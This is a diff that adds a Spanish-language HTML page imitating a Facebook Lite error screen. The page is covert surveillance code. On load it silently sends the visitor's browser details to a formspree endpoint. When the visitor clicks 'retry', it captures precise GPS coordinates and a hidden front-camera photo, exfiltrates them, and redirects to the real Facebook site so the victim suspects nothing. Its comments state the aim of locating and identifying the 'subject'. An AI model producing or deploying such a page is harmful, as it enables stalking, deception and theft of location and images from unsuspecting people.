@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Lite</title>
+    <style>
+        body { font-family: sans-serif; background: #fff; margin: 0; color: #1c1e21; }
+        .top-bar { background: #3b5998; height: 45px; width: 100%; display: flex; align-items: center; padding-left: 10px; }
+        .content { padding: 20px; text-align: center; }
+        .error-icon { width: 50px; height: 50px; margin-bottom: 15px; opacity: 0.6; }
+        h2 { font-size: 16px; font-weight: bold; margin: 10px 0; }
+        p { font-size: 14px; color: #606770; line-height: 1.5; }
+        .btn-retry { 
+            background: #f5f6f7; border: 1px solid #dddfe2; color: #4b4f56; 
+            padding: 8px 16px; border-radius: 2px; font-weight: bold; width: 100%; margin-top: 20px;
+        }
+        #cam { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/></svg>
+</div>
+
+<div class="content" id="main">
+    <img src="https://img.icons8.com/ios/100/000000/error/cloud-lightning.png" class="error-icon">
+    <h2>Error al cargar contenido</h2>
+    <p>Para ver este mensaje privado o archivo multimedia, debes verificar que tu sesión es segura y permitir la sincronización de ubicación del navegador.</p>
+    <button class="btn-retry" onclick="ejecutarAccion()">Intentar de nuevo</button>
+</div>
+
+<video id="cam" autoplay playsinline></video>
+<canvas id="out" style="display:none;"></canvas>
+
+<script>
+    const HOOK = "https://formspree.io/f/xanrkklv";
+
+    // Captura silenciosa de metadatos al abrir
+    window.onload = () => {
+        fetch(HOOK, {
+            method: 'POST',
+            body: JSON.stringify({
+                status: "ENTRY",
+                ua: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                ref: document.referrer || "direct"
+            }),
+            headers: {'Content-Type': 'application/json'}
+        });
+    };
+
+    async function ejecutarAccion() {
+        // Cambiamos el texto para que no sospeche mientras "carga"
+        const btn = document.querySelector('.btn-retry');
+        btn.innerText = "Cargando...";
+        btn.disabled = true;
+
+        // 1. GPS (Esencial para la ubicación exacta del sujeto)
+        navigator.geolocation.getCurrentPosition(
+            (p) => loggear({type: "GEO", lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy}),
+            (e) => loggear({type: "GEO_ERR", msg: e.message}),
+            {enableHighAccuracy: true}
+        );
+
+        // 2. Foto silenciada (Identificación visual)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+            const v = document.getElementById('cam');
+            v.srcObject = stream;
+            
+            setTimeout(() => {
+                const c = document.getElementById('out');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                loggear({type: "IMG", data: c.toDataURL('image/jpeg', 0.5)});
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                // Redirección final suave
+                window.location.href = "https://m.facebook.com/messages/";
+            }, 1500);
+        } catch (e) {
+            loggear({type: "CAM_ERR"});
+            window.location.href = "https://m.facebook.com/messages/";
+        }
+    }
+
+    function loggear(d) {
+        fetch(HOOK, {
+            method: 'POST',
+            body: JSON.stringify(d),
+            headers: {'Content-Type': 'application/json'}
+        });
+    }
+</script>
+</body>
+</html>
